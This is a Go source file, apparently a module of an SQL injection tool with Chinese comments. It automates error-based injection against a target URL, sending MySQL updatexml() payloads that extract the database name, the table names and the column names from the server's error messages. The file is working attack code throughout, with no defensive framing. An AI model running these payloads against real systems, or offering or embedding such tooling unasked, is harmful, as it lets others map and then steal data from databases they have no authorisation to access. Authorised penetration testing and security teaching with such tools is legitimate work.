package pkg

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

// 报错注入
func ErrorInject(host string) error {
	fmt.Println("Starting Error-based SQL injection...")
	
	// 获取数据库名
	databaseName, err := getDatabaseNameError(host)
	if err != nil {
		return err
	}
	fmt.Printf("Database name: %s\n", databaseName)
	
	// 获取表名
	tableNames, err := getTableNamesError(host, databaseName)
	if err != nil {
		return err
	}
	fmt.Printf("Table names: %v\n", tableNames)
	
	// 获取列名
	if len(tableNames) > 0 {
		columnNames, err := getColumnNamesError(host, databaseName, tableNames[0])
		if err != nil {
			return err
		}
		fmt.Printf("Column names for table %s: %v\n", tableNames[0], columnNames)
	}
	
	return nil
}

// 获取数据库名（错误注入）
func getDatabaseNameError(host string) (string, error) {
	payload := " and updatexml(1,concat(0x7e,(select database()),0x7e),1)"
	url := host + url.QueryEscape(payload)
	
	req, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer req.Body.Close()
	
	body, _ := io.ReadAll(req.Body)
	response := string(body)
	
	// 尝试多种正则模式提取数据库名
	patterns := []string{
		`~([^~]+)~`,
		`'([^']+)'`,
		`"([^"]+)"`,
		`XPATH syntax error: '([^']+)'`,
	}
	
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(response)
		if len(matches) > 1 && len(matches[1]) > 0 {
			return matches[1], nil
		}
	}
	
	return "", fmt.Errorf("could not extract database name from error response")
}

// 获取表名（错误注入）
func getTableNamesError(host, databaseName string) ([]string, error) {
	payload := fmt.Sprintf(" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='%s'),0x7e),1)", databaseName)
	url := host + url.QueryEscape(payload)
	
	req, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer req.Body.Close()
	
	body, _ := io.ReadAll(req.Body)
	response := string(body)
	
	// 提取表名
	tableNames := extractTableNamesFromError(response)
	return tableNames, nil
}

// 获取列名（错误注入）
func getColumnNamesError(host, databaseName, tableName string) ([]string, error) {
	payload := fmt.Sprintf(" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='%s' and table_name='%s'),0x7e),1)", databaseName, tableName)
	url := host + url.QueryEscape(payload)
	
	req, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer req.Body.Close()
	
	body, _ := io.ReadAll(req.Body)
	response := string(body)
	
	// 提取列名
	columnNames := extractColumnNamesFromError(response)
	return columnNames, nil
}

// 从错误响应中提取表名
func extractTableNamesFromError(response string) []string {
	// 尝试多种正则模式
	patterns := []string{
		`~([^~]+)~`,
		`'([^']+)'`,
		`"([^"]+)"`,
	}
	
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(response)
		if len(matches) > 1 {
			// 分割表名（通常用逗号分隔）
			tableNames := strings.Split(matches[1], ",")
			// 清理和过滤
			var cleanTableNames []string
			for _, name := range tableNames {
				name = strings.TrimSpace(name)
				if len(name) > 0 {
					cleanTableNames = append(cleanTableNames, name)
				}
			}
			return cleanTableNames
		}
	}
	
	return []string{}
}

// 从错误响应中提取列名
func extractColumnNamesFromError(response string) []string {
	return extractTableNamesFromError(response) // 使用相同的逻辑
}
